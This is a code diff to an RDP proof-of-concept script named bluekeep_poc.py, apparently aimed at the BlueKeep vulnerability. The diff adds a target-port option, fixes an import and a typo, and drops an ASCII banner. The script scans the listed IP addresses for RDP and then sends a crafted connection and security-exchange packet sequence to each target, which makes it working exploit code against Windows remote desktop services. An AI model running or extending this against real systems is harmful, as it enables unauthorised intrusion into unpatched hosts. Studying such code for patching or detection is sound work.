@@ -1,9 +1,11 @@
+#!/usr/bin/env python
 import socket
 import binascii
 import argparse
+import impacket
 
 from OpenSSL import *
-from impacket.impacket.structure import Structure
+from impacket.structure import Structure
 
 
 # impacket structures
@@ -221,11 +223,18 @@ class Parser(argparse.ArgumentParser):
     @staticmethod
     def optparse():
         parser = argparse.ArgumentParser()
-        parser.add_argument("-i", "--ip", dest="ipAddyList", default=None,
-                            help="provide a list of IP addresses separated by commas, or a single IP address"
-                            )
-        parser.add_argument("-f", "--file", dest="ipAddyFile", default=None,
-                            help="provide a file containing IP addresses, one per line")
+        parser.add_argument(
+            "-i", "--ip", dest="ipAddyList", metavar="IP[IP,IP,...]", default=None,
+            help="provide a list of IP addresses separated by commas, or a single IP address"
+        )
+        parser.add_argument(
+            "-p", "--port", type=int, dest="targetPort", metavar="PORT", default=3389,
+            help="Specify the target port number (*default=3389)"
+        )
+        parser.add_argument(
+            "-f", "--file", dest="ipAddyFile", metavar="FILE", default=None,
+            help="provide a file containing IP addresses, one per line"
+        )
         return parser.parse_args()
 
 
@@ -259,13 +268,13 @@ def socket_connection(obj, address, port=3389, receive_size=4000):
 
 
 # check if the ip is running RDP or not
-def check_rdp_service(address):
+def check_rdp_service(address, port=3389):
     rdp_correlation_packet = Packer(
         "436f6f6b69653a206d737473686173683d75736572300d0a010008000100000000"
     ).bin_unpack()
     test_packet = DoPduConnectionSequence().connection_request_pdu()
     send_packet = test_packet + rdp_correlation_packet
-    results = socket_connection(send_packet, address, receive_size=9126)
+    results = socket_connection(send_packet, address, port, receive_size=9126)
     if results is not None:
         if results[0]:
             info("successfully connected to RDP service on host: {}".format(address))
@@ -277,7 +286,7 @@ def check_rdp_service(address):
 
 
 # start the connection like a boss
-def start_rdp_connection(ip_addresses):
+def start_rdp_connection(ip_addresses, port=3389):
     tpkt = TPKT()
     tpdu = TPDU()
     rdp_neg = RDP_NEG_REQ()
@@ -289,7 +298,7 @@ def start_rdp_connection(ip_addresses):
     for ip in ip_addresses:
         try:
             ip = ip.strip()
-            results = socket_connection(tpkt.getData(), ip, receive_size=1024)
+            results = socket_connection(tpkt.getData(), ip, port, receive_size=1024)
             ctx = SSL.Context(SSL.TLSv1_METHOD)
             tls = SSL.Connection(ctx, results[1])
             tls.set_connect_state()
@@ -321,7 +330,7 @@ def start_rdp_connection(ip_addresses):
                 ))
 
             # my personal favorite is the security exchange, took me awhile to figure this one out
-            info("sending Client Security Exhcange PDU packets {}".format(SENT))
+            info("sending Client Security Exchange PDU packets {}".format(SENT))
             tls.sendall(DoPduConnectionSequence().do_client_security_pdu_exchange())
             tls.sendall(DoPduConnectionSequence().client_info_pdu())
             returned_packet = tls.recv(8000)
@@ -390,6 +399,7 @@ def start_rdp_connection(ip_addresses):
 def main():
     to_scan = []
     opt = Parser().optparse()
+    port = opt.targetPort
     if opt.ipAddyList is not None:
         for ip in opt.ipAddyList.split(","):
             to_scan.append(ip)
@@ -403,25 +413,15 @@ def main():
             for address in addresses.readlines():
                 to_scan.append(address.strip())
     else:
-        info("python bluekeep_poc.py [-i addy1[,addy2,...]] [-f /path/to/file]")
+        info("python bluekeep_poc.py [-i IP[IP,IP,...]] [-p PORT] [-f FILE]")
         exit(1)
     for scan in to_scan:
         info("verifying RDP service on: {}".format(scan))
-        check_rdp_service(scan)
+        check_rdp_service(scan, port)
     info("starting RDP connection on {} targets".format(len(GIS_RDP)))
-    print("\n\n")
-    start_rdp_connection(GIS_RDP)
+    print("\n")
+    start_rdp_connection(GIS_RDP, port)
 
 
 if __name__ == "__main__":
-    print("""\033[34m
-  ____  _            _  __               
- |  _ \| |          | |/ /               
- | |_) | |_   _  ___| ' / ___  ___ _ __  
- |  _ <| | | | |/ _ \  < / _ \/ _ \ '_ \ 
- | |_) | | |_| |  __/ . \  __/  __/ |_) |
- |____/|_|\__,_|\___|_|\_\___|\___| .__/ 
-                                  | |    
-                                  |_|
-\033[0m""")
     main()
